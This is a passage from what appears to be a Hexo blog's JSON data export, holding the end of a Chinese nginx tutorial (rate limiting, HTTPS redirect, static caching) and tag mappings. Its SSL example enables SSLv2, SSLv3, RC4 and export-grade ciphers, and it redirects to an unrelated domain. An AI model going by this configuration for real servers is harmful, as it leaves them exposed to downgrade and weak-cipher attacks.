#设置nodelay，25个请求将在第1秒执行。</span><br><span class=\"line\"></span><br><span class=\"line\">      limit_req zone=allips burst=5 nodelay;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ...</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-https代理\"><a href=\"#4-https代理\" class=\"headerlink\" title=\"4.https代理\"></a>4.https代理</h2><p>配置 SSL 将 http 代理到 https</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#原80端口做301转跳</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name w3cschool.cn www.w3cschool.cn;</span><br><span class=\"line\">    return 301 https://www.zhimiyun.com$request_uri;    #跳转到Https</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#配置ssl证书和开启ssl功能</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen       443;</span><br><span class=\"line\">    server_name  www.w3cschool.cn;</span><br><span class=\"line\">    root   wwwroot;</span><br><span class=\"line\">    index  index.html index.htm;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl                  on;</span><br><span class=\"line\">    ssl_certificate      /usr/ssl/ca.pem; #证书地址</span><br><span class=\"line\">    ssl_certificate_key  /usr/ssl/ca.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_protocols  SSLv2 SSLv3 TLSv1 TLSv1.1 TLSv1.2;</span><br><span class=\"line\">    ssl_ciphers  ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;</span><br><span class=\"line\">    ssl_prefer_server_ciphers   on;</span><br><span class=\"line\">    error_page 497 &quot;https://$host$uri?$args&quot;; #这是跳转Http请求到Https</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-静态资源缓存\"><a href=\"#5-静态资源缓存\" class=\"headerlink\" title=\"5.静态资源缓存\"></a>5.静态资源缓存</h2><p>对于站点中不经常修改的静态内容（如图片，JS，CSS），可以设置静态资源缓存，控制浏览器缓存，达到有效减小带宽流量，降低服务器压力。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ &#123;</span><br><span class=\"line\">#过期时间为30天，</span><br><span class=\"line\">#图片文件不怎么更新，过期可以设大一点，</span><br><span class=\"line\">#如果频繁更新，则可以设置得小一点。</span><br><span class=\"line\">expires 30d;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location ~ .*\\.(js|css)$ &#123;</span><br><span class=\"line\">expires 10d;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ck23321fq00016dcpsjh32s9x","tag_id":"ck23321ft00036dcp9diy3fgv","_id":"ck23321fz00076dcp4l4x53mr"},{"post_id":"ck23321fs00026dcpdb3stqup","tag_id":"ck23321fz00066dcp4mkqbqr3","_id":"ck23321g100096dcp979w006x"},{"post_id":"ck23321fu00046dcpb99vfh8g","tag_id":"ck23321fz00066dcp4mkqbqr3","_id":"ck23321g2000b6dcpt3qyvxj9"},{"post_id":"ck23321fv00056dcpgrndw887","tag_id":"ck23321fz00066dcp4mkqbqr3","_id":"ck23321g2000c6dcpeh9tp9z3"},{"post_id":"ck23321gp000d6dcp57uqg977","tag_id":"ck23321fz00066dcp4mkqbqr3","_id":"ck23321gs000f6dcp7x91p3ne"},{"post_id":"ck23321h8000g6dcp6tk4sh86","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321hi000n6dcp7undlgbm"},{"post_id":"ck23321h9000h6dcpfa71vbgv","tag_id":"ck23321hg000m6dcp95behfji","_id":"ck23321hp000s6dcppske8a0w"},{"post_id":"ck23321ha000j6dcp33i6ldx1","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321hv000w6dcpkc8k3jwx"},{"post_id":"ck23321hu000v6dcpnrn5j5as","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321hy000z6dcpai02c009"},{"post_id":"ck23321hx000x6dcploov41np","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321hz00116dcp4a1eh4v7"},{"post_id":"ck23321hc000k6dcpbwhcn9wx","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321i100156dcpi7ipnhjh"},{"post_id":"ck23321hc000k6dcpbwhcn9wx","tag_id":"ck23321hy000y6dcplr3aogfb","_id":"ck23321i200176dcp653boxq9"},{"post_id":"ck23321hf000l6dcpagy0g4la","tag_id":"ck23321hg000m6dcp95behfji","_id":"ck23321i3001a6dcpa0mr5hfx"},{"post_id":"ck23321i4001d6dcp9resqbfb","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321i6001f6dcpiq31me9j"},{"post_id":"ck23321hi000o6dcpy5axc6n6","tag_id":"ck23321hy000y6dcplr3aogfb","_id":"ck23321i7001i6dcpj4252xdf"},{"post_id":"ck23321hi000o6dcpy5axc6n6","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321i8001k6dcpjwyzscbx"},{"post_id":"ck23321i5001e6dcp2gts2zyd","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321i9001n6dcpi8d0lm8c"},{"post_id":"ck23321i5001e6dcp2gts2zyd","tag_id":"ck23321hy000y6dcplr3aogfb","_id":"ck23321ia001p6dcpm2nz8j99"},{"post_id":"ck23321hl000p6dcp48f22rcz","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321id001s6dcp3yhz266o"},{"post_id":"ck23321i7001j6dcp0zgsjl6b","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ie001u6dcpcnp3acel"},{"post_id":"ck23321ho000r6dcpb8l7jghe","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ie001x6dcpp2o6w4mc"},{"post_id":"ck23321i9001o6dcplcn2masc","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321if001z6dcpuhbtm2vp"},{"post_id":"ck23321ia001r6dcp0qzcon71","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ig00226dcpdykk1d59"},{"post_id":"ck23321hs000t6dcp3uhj5kwo","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ih00246dcpkzv1wstq"},{"post_id":"ck23321hy00106dcp6wolmvs5","tag_id":"ck23321ie001v6dcp7rkaygwx","_id":"ck23321ih00276dcpf3zx9jzs"},{"post_id":"ck23321i000146dcph8cnx3vb","tag_id":"ck23321ie001v6dcp7rkaygwx","_id":"ck23321ii00296dcp4oxdnrd5"},{"post_id":"ck23321i100166dcp40nud7me","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ij002d6dcpec4x99bx"},{"post_id":"ck23321i100166dcp40nud7me","tag_id":"ck23321ih00266dcpxbzdp6im","_id":"ck23321ik002f6dcpw2emknl0"},{"post_id":"ck23321i200196dcpwv3kcknm","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ik002h6dcp6v9py5kr"},{"post_id":"ck23321i200196dcpwv3kcknm","tag_id":"ck23321ij002b6dcpweouzvc2","_id":"ck23321ik002i6dcp98g6p8zd"},{"post_id":"ck23321i3001b6dcp2a3grjeh","tag_id":"ck23321ik002g6dcpuihsqzsk","_id":"ck23321il002k6dcp3rggyfoe"},{"post_id":"ck23321i6001h6dcpv9p6ntfk","tag_id":"ck23321hy000y6dcplr3aogfb","_id":"ck23321il002m6dcp6lwfq5d6"},{"post_id":"ck23321i6001h6dcpv9p6ntfk","tag_id":"ck23321ik002j6dcpibmnfbaz","_id":"ck23321il002n6dcpf9cdrzpr"},{"post_id":"ck23321i6001h6dcpv9p6ntfk","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321il002p6dcpx12bay60"},{"post_id":"ck23321i8001m6dcpcwtu88cv","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321il002q6dcpc7f827nn"},{"post_id":"ck23321i8001m6dcpcwtu88cv","tag_id":"ck23321ij002b6dcpweouzvc2","_id":"ck23321im002s6dcp4udcxney"},{"post_id":"ck23321id001t6dcpzz6vn93o","tag_id":"ck23321il002o6dcpl8jvjrs4","_id":"ck23321im002t6dcp2evudn1t"},{"post_id":"ck23321ie001w6dcpx17hgb6p","tag_id":"ck23321il002r6dcprtkvz6gi","_id":"ck23321im002v6dcpaigh7ufl"},{"post_id":"ck23321ie001y6dcp35xyy5gm","tag_id":"ck23321il002r6dcprtkvz6gi","_id":"ck23321im002x6dcpz718eww2"},{"post_id":"ck23321if00206dcp689j9w9f","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321in002z6dcpzy9122pq"},{"post_id":"ck23321ig00236dcp9c9rxg4c","tag_id":"ck23321il002o6dcpl8jvjrs4","_id":"ck23321in00316dcpj0z409et"},{"post_id":"ck23321ih00256dcpkqdfqdon","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321io00346dcp07s4jhfm"},{"post_id":"ck23321ih00256dcpkqdfqdon","tag_id":"ck23321in00326dcp8azr6y0b","_id":"ck23321io00356dcpq7t6zc86"},{"post_id":"ck23321ii00286dcpl1h95pn2","tag_id":"ck23321in00326dcp8azr6y0b","_id":"ck23321io00376dcphlsba78o"},{"post_id":"ck23321ii002a6dcp2bh004d8","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321io00396dcpdoji6csp"},{"post_id":"ck23321ij002c6dcp38az62ze","tag_id":"ck23321io00386dcplf59ahr8","_id":"ck23321ip003b6dcprfhmkesz"},{"post_id":"ck23321ik002e6dcpk9fbqu8l","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321ip003c6dcpkbjm0h6f"},{"post_id":"ck23321j0003d6dcp9s6suy7o","tag_id":"ck23321hy000y6dcplr3aogfb","_id":"ck23321j2003f6dcpy85db2cn"},{"post_id":"ck23321j1003e6dcpuhu2v55g","tag_id":"ck23321hy000y6dcplr3aogfb","_id":"ck23321j9003h6dcpc9uqetn7"},{"post_id":"ck23321j2003g6dcpfbmpn5z0","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321je003i6dcpx4awhwan"},{"post_id":"ck23321l5003j6dcprqqytab6","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321l6003l6dcplloxyjdp"},{"post_id":"ck23321l5003k6dcpfgp1du9r","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321lb003n6dcp32nn374h"},{"post_id":"ck23321l6003m6dcppuefcsp6","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321lb003p6dcpbbdzyrtp"},{"post_id":"ck23321lb003o6dcpj78xpata","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321lc003r6dcpydeb0u0j"},{"post_id":"ck23321lb003q6dcpjvjd96za","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321ld003t6dcpmdmhfpx1"},{"post_id":"ck23321lc003s6dcp0ccia5d0","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321ld003v6dcp7aatttr3"},{"post_id":"ck23321ld003u6dcpko20maiu","tag_id":"ck23321h9000i6dcpw0xjnvy9","_id":"ck23321le003x6dcp1xlnuu58"},{"post_id":"ck23321ld003w6dcp18d1twq0","tag_id":"ck23321hg000m6dcp95behfji","_id":"ck23321lf003z6dcpxzoycic0"},{"post_id":"ck23321lg00426dcp3pnr00el","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lh00446dcpo1bodelc"},{"post_id":"ck23321lh00436dcpba6ngmnl","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321li00476dcpmbh2fmkd"},{"post_id":"ck23321lf003y6dcpg0tou3k4","tag_id":"ck23321lg00416dcppitguwvi","_id":"ck23321lj00496dcp3m0z2bj2"},{"post_id":"ck23321lh00456dcpi79bds70","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ll004b6dcpshrjd3zy"},{"post_id":"ck23321lf00406dcpxsm9glgn","tag_id":"ck23321lg00416dcppitguwvi","_id":"ck23321ll004d6dcphb4v6xgt"},{"post_id":"ck23321lj004a6dcpjxx5dy1d","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lm004f6dcps6xd221z"},{"post_id":"ck23321ll004c6dcpk8ksfqoe","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ln004h6dcphatb212i"},{"post_id":"ck23321ll004c6dcpk8ksfqoe","tag_id":"ck23321lg00416dcppitguwvi","_id":"ck23321ln004j6dcpfwny59vl"},{"post_id":"ck23321ll004e6dcpvvg16vk3","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lo004l6dcpj80o0rnu"},{"post_id":"ck23321lm004g6dcpksqelgfb","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lp004n6dcpe1l7f296"},{"post_id":"ck23321lm004g6dcpksqelgfb","tag_id":"ck23321ij002b6dcpweouzvc2","_id":"ck23321lp004p6dcp5boubwwz"},{"post_id":"ck23321ln004i6dcpyo93fsxb","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lq004r6dcpm2t10876"},{"post_id":"ck23321ln004i6dcpyo93fsxb","tag_id":"ck23321ij002b6dcpweouzvc2","_id":"ck23321lr004t6dcph8iczasz"},{"post_id":"ck23321ln004k6dcpz0yejgsp","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321ls004v6dcptyu8tide"},{"post_id":"ck23321ln004k6dcpz0yejgsp","tag_id":"ck23321ij002b6dcpweouzvc2","_id":"ck23321ls004x6dcp3qg56fjz"},{"post_id":"ck23321lo004m6dcpxxhgwg12","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lt004z6dcpqp30vyyb"},{"post_id":"ck23321lp004o6dcpn08zcuzn","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lu00516dcp7p4t5kk8"},{"post_id":"ck23321lp004q6dcpwg2r9d1t","tag_id":"ck23321ik002j6dcpibmnfbaz","_id":"ck23321lu00546dcpvoo7o998"},{"post_id":"ck23321lq004s6dcpygvrknkk","tag_id":"ck23321il002r6dcprtkvz6gi","_id":"ck23321lv00566dcpccygswkt"},{"post_id":"ck23321lr004u6dcp2o656cqa","tag_id":"ck23321il002r6dcprtkvz6gi","_id":"ck23321lv00576dcpjjcewxlm"},{"post_id":"ck23321ls004y6dcpex2pig9t","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321lv00596dcp1w7j7kf3"},{"post_id":"ck23321lt00506dcplxhnfnvw","tag_id":"ck23321lu00536dcpfypdyy0x","_id":"ck23321lv005a6dcpljv5ip7k"},{"post_id":"ck23321lu00526dcp2z4fha98","tag_id":"ck23321lu00536dcpfypdyy0x","_id":"ck23321lw005c6dcpri848l7i"},{"post_id":"ck23321lu00526dcp2z4fha98","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lw005d6dcpbxytf68n"},{"post_id":"ck23321lu00556dcpkosvbb0s","tag_id":"ck23321lu00536dcpfypdyy0x","_id":"ck23321lw005e6dcp714iyw11"},{"post_id":"ck23321lu00556dcpkosvbb0s","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321lw005f6dcptvy7yy4f"},{"post_id":"ck23321m0005g6dcp03z8u23e","tag_id":"ck23321ht000u6dcpwysqxoyg","_id":"ck23321m3005i6dcprbsw61qh"},{"post_id":"ck23321m2005h6dcp3bjsagoh","tag_id":"ck23321il002r6dcprtkvz6gi","_id":"ck23321m3005k6dcp5wfvfvvt"},{"post_id":"ck23321m3005j6dcp33xh8c1n","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321m4005l6dcpfjznc4sa"},{"post_id":"ck23321m5005m6dcplfngv9il","tag_id":"ck23321il002r6dcprtkvz6gi","_id":"ck23321m6005n6dcp057vxalb"},{"post_id":"ck23321m7005o6dcp2wj2sbfd","tag_id":"ck23321il002r6dcprtkvz6gi","_id":"ck23321m9005q6dcp5775eu7v"},{"post_id":"ck23321m8005p6dcpio37yrze","tag_id":"ck23321im002w6dcpwc74ba3i","_id":"ck23321m9005r6dcp5p8fz6yt"}],"Tag":[{"name":"Index","_id":"ck23321ft00036dcp9diy3fgv"},{"name":"others","_id":"ck23321fz00066dcp4mkqbqr3"},{"name":"algorithm","_id":"ck23321h9000i6dcpw0xjnvy9"},{"name":"base","_id":"ck23321hg000m6dcp95behfji"},{"name":"java","_id":"ck23321ht000u6dcpwysqxoyg"},{"name":"springboot","_id":"ck23321hy000y6dcplr3aogfb"},{"name":"Index2","_id":"ck23321ie001v6dcp7rkaygwx"},{"name":"面向对象","_id":"ck23321ih00266dcpxbzdp6im"},{"name":"spring","_id":"ck23321ij002b6dcpweouzvc2"},{"name":"mysql","_id":"ck23321ik002g6dcpuihsqzsk"},{"name":"tomcat","_id":"ck23321ik002j6dcpibmnfbaz"},{"name":"linux","_id":"ck23321il002o6dcpl8jvjrs4"},{"name":"security","_id":"ck23321il002r6dcprtkvz6gi"},{"name":"tools","_id":"ck23321im002w6dcpwc74ba3i"},{"name":"docker","_id":"ck23321in00326dcp8azr6y0b"},{"name":"database","_id":"ck23321io00386dcplf59ahr8"},{"name":"protocol","_id":"ck23321lg00416dcppitguwvi"},{"name":"wheels","_id":"ck23321lu00536dcpfypdyy0x"}]}}